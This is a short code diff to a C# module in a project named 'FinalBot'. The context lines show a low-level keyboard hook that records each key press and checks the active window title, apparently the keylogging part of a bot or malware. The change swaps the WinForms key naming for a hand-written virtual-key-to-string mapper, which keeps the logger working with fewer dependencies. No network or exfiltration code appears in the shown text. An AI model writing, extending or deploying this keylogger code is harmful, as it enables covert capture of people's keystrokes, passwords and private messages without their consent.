@@ -3,7 +3,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
-using System.Windows.Forms;
+using System.Collections.Generic;
 
 namespace FinalBot.Modules
 {
@@ -50,7 +50,7 @@ namespace FinalBot.Modules
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                string key = ((Keys)vkCode).ToString();
+                string key = VkToString(vkCode);
 
                 CheckActiveWindow();
 
@@ -98,5 +98,23 @@ namespace FinalBot.Modules
 
         [DllImport("user32.dll")]
         private static extern int GetWindowTextLength(IntPtr hWnd);
+
+        private static string VkToString(int vk)
+        {
+            if (vk >= 0x41 && vk <= 0x5A) return ((char)vk).ToString(); // A-Z
+            if (vk >= 0x30 && vk <= 0x39) return ((char)vk).ToString(); // 0-9
+            return vk switch
+            {
+                0x20 => "Space", 0x0D => "Return", 0x08 => "Back",
+                0x09 => "Tab",   0x1B => "Escape", 0x2E => "Delete",
+                0x26 => "Up",    0x28 => "Down",   0x25 => "Left",   0x27 => "Right",
+                0x10 => "Shift", 0x11 => "Ctrl",   0x12 => "Alt",
+                0xBA => ";",     0xBB => "=",       0xBC => ",",
+                0xBD => "-",     0xBE => ".",       0xBF => "/",
+                0xC0 => "`",     0xDB => "[",       0xDC => "\\",
+                0xDD => "]",     0xDE => "'",
+                _ => $"[{vk:X2}]"
+            };
+        }
     }
 }
